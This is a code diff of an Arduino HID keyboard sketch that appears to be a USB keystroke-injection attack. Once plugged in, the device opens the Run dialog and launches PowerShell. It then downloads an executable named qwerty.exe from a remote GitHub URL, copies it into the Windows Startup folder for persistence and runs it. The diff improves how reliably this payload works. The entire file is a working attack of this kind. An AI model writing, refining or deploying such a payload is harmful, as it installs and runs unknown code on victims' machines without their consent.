@@ -2,7 +2,6 @@
 
 HIDKeyboard keyboard;
 
-#define ENTER 0x28
 #define GUI   0x08
 #define KEY_R 0x15
 
@@ -10,29 +9,44 @@ void setup() {
   keyboard.begin();
   delay(1500);  // Let USB settle
 
-  // Step 1: Win + R
+  // Step 1: Open Run dialog (Win + R)
   keyboard.pressKey(GUI, KEY_R);
   delay(100);
   keyboard.releaseKey();
 
   delay(2000);  // Wait for Run dialog to appear
 
-  // Step 2: Type "powershell" and press Enter
-  keyboard.println((char*)"powershell");
+  // Step 2: Type "powershell"
+  keyboard.print((char*)"powershell");
 
-  // ✅ Step 3: Wait for PowerShell window to launch
+  // Step 3: Press Enter
+  delay(500);
+  keyboard.println((char*)"");
+
+  // Step 4: Wait for PowerShell to launch
   delay(3500);
 
-  // ✅ Step 4: Run PowerShell commands
+  // Step 5: Download qwerty.exe to Downloads folder
   keyboard.println((char*)"Invoke-WebRequest -Uri https://github.com/vaibhavpatil2734/QWERTY/raw/main/qwerty.exe -OutFile $env:USERPROFILE\\Downloads\\qwerty.exe");
   delay(5000);
 
-  keyboard.println((char*)"Copy-Item $env:USERPROFILE\\Downloads\\qwerty.exe -Destination $env:APPDATA\\Microsoft\\Windows\\Start\\Menu\\Programs\\Startup\\qwerty.exe");
-  delay(3000);
+  // Step 6: Define Startup folder path
+  keyboard.println((char*)"$dest = \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"");
+  delay(500);
 
-  keyboard.println((char*)"$env:APPDATA\\Microsoft\\Windows\\Start\\Menu\\Programs\\Startup\\qwerty.exe");
+  // Step 7: Ensure folder exists
+  keyboard.println((char*)"New-Item -ItemType Directory -Force -Path $dest");
+  delay(500);
+
+  // Step 8: Copy the .exe to Startup folder
+  keyboard.println((char*)"Copy-Item \"$env:USERPROFILE\\Downloads\\qwerty.exe\" -Destination \"$dest\\qwerty.exe\" -Force");
+  delay(500);
+
+  // Step 9: Run the executable from Startup folder
+  keyboard.println((char*)"& \"$dest\\qwerty.exe\"");
   delay(2000);
 
+  // ✅ Step 10: Exit PowerShell
   keyboard.println((char*)"exit");
 
   // Done
